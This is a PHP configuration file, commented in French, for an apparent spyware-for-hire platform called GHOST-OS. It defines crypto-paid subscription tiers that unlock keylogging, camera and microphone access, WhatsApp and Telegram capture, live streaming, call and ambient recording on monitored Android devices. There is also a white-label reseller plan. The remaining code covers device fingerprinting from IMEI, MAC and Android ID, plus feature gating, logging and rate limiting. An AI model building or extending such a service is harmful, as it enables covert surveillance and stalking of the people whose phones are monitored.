<?php
// config/ghost_config.php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../logs/error.log');

// ============================================
// CONSTANTES DE BASE
// ============================================
define('GHOST_VERSION', '3.0.0');
define('GHOST_NAME', 'GHOST-OS');
define('GHOST_DOMAIN', $_SERVER['HTTP_HOST'] ?? 'localhost');
define('GHOST_URL', (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . GHOST_DOMAIN);
define('GHOST_ROOT', dirname(__DIR__));
define('GHOST_UPLOAD', GHOST_ROOT . '/uploads/');
define('GHOST_LOGS', GHOST_ROOT . '/logs/');

// ============================================
// BASE DE DONNÉES
// ============================================
define('DB_HOST', 'localhost');
define('DB_NAME', 'ghost_os');
define('DB_USER', 'ghost_user');
define('DB_PASS', 'VotreMotDePasseSuperSecure123!');
define('DB_CHARSET', 'utf8mb4');

try {
    $pdo = new PDO(
        "mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=".DB_CHARSET,
        DB_USER,
        DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            PDO::ATTR_EMULATE_PREPARES => false
        ]
    );
} catch(PDOException $e) {
    die(json_encode(['error' => 'Database connection failed']));
}

// ============================================
// SYSTÈME DE PAIEMENT CRYPTO
// ============================================
define('CRYPTO_ENABLED', true);

// Adresses de réception USDT (à remplacer par les vôtres)
define('USDT_TRC20_ADDRESS', 'TYourTRC20AddressHere');
define('USDT_ERC20_ADDRESS', '0xYourERC20AddressHere');
define('BTC_ADDRESS', '1YourBitcoinAddressHere');
define('ETH_ADDRESS', '0xYourEthereumAddressHere');

// API Blockchain (pour vérifier les transactions)
define('TRONGRID_API', 'https://api.trongrid.io');
define('ETHERSCAN_API_KEY', 'YourEtherscanKey');
define('BLOCKCHAIN_INFO_API', 'https://blockchain.info');

// ============================================
// PLANS TARIFAIRES (en USDT)
// ============================================
define('PRICING', [
    'free' => [
        'name' => 'Essai Gratuit',
        'price_usdt' => 0,
        'duration_days' => 3,
        'max_devices' => 1,
        'features' => [
            'screenshot' => true,
            'location' => true,
            'contacts' => true,
            'camera' => false,
            'keylogger' => false,
            'microphone' => false,
            'files' => false,
            'whatsapp' => false,
            'streaming' => false,
            'real_time' => false
        ]
    ],
    'premium' => [
        'name' => 'Premium',
        'price_usdt' => 29.99,
        'duration_days' => 30,
        'max_devices' => 3,
        'features' => [
            'screenshot' => true,
            'location' => true,
            'contacts' => true,
            'camera' => true,
            'keylogger' => true,
            'microphone' => true,
            'files' => true,
            'whatsapp' => false,
            'streaming' => true,
            'real_time' => true
        ]
    ],
    'enterprise' => [
        'name' => 'Enterprise',
        'price_usdt' => 99.99,
        'duration_days' => 30,
        'max_devices' => 10,
        'features' => [
            'screenshot' => true,
            'location' => true,
            'contacts' => true,
            'camera' => true,
            'keylogger' => true,
            'microphone' => true,
            'files' => true,
            'whatsapp' => true,
            'telegram' => true,
            'streaming' => true,
            'real_time' => true,
            'voice_call' => true,
            'surrounding' => true
        ]
    ],
    'reseller' => [
        'name' => 'Revendeur',
        'price_usdt' => 499.99,
        'duration_days' => 365,
        'max_devices' => 100,
        'features' => [
            'all' => true,
            'api_access' => true,
            'white_label' => true,
            'reseller_panel' => true
        ]
    ]
]);

// ============================================
// FONCTIONS UTILITAIRES
// ============================================

/**
 * Génère un fingerprint unique pour l'appareil
 */
function generateDeviceFingerprint($data) {
    $string = implode('|', [
        $data['android_id'] ?? '',
        $data['serial'] ?? '',
        $data['mac'] ?? '',
        $data['imei'] ?? '',
        $data['google_ad_id'] ?? ''
    ]);
    return hash('sha256', $string);
}

/**
 * Vérifie si un utilisateur a accès à une fonctionnalité
 */
function hasFeature($user, $feature) {
    if (!$user || $user['account_status'] !== 'active') {
        return false;
    }
    
    // Vérifier si l'abonnement est actif
    if ($user['subscription_end'] && strtotime($user['subscription_end']) < time()) {
        return false;
    }
    
    $plan = PRICING[$user['account_type']];
    
    if (isset($plan['features']['all']) && $plan['features']['all']) {
        return true;
    }
    
    return $plan['features'][$feature] ?? false;
}

/**
 * Génère une clé API
 */
function generateApiKey() {
    return bin2hex(random_bytes(32));
}

/**
 * Journalise une activité
 */
function logActivity($pdo, $userId, $deviceId, $action, $details = null) {
    $stmt = $pdo->prepare("
        INSERT INTO activity_logs (user_id, device_id, action, details, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
    ");
    
    $stmt->execute([
        $userId,
        $deviceId,
        $action,
        $details ? json_encode($details) : null,
        $_SERVER['REMOTE_ADDR'] ?? null,
        $_SERVER['HTTP_USER_AGENT'] ?? null
    ]);
}

/**
 * Vérifie les bans
 */
function isBanned($pdo, $type, $value) {
    $stmt = $pdo->prepare("
        SELECT COUNT(*) FROM bans 
        WHERE identifier_type = ? AND identifier_value = ? 
        AND (expires_at IS NULL OR expires_at > NOW())
    ");
    $stmt->execute([$type, $value]);
    return $stmt->fetchColumn() > 0;
}

/**
 * Rate limiting
 */
function checkRateLimit($pdo, $userId, $action, $maxPerHour = 100) {
    $stmt = $pdo->prepare("
        SELECT COUNT(*) FROM activity_logs 
        WHERE user_id = ? AND action = ? 
        AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)
    ");
    $stmt->execute([$userId, $action]);
    return $stmt->fetchColumn() < $maxPerHour;
}
?>
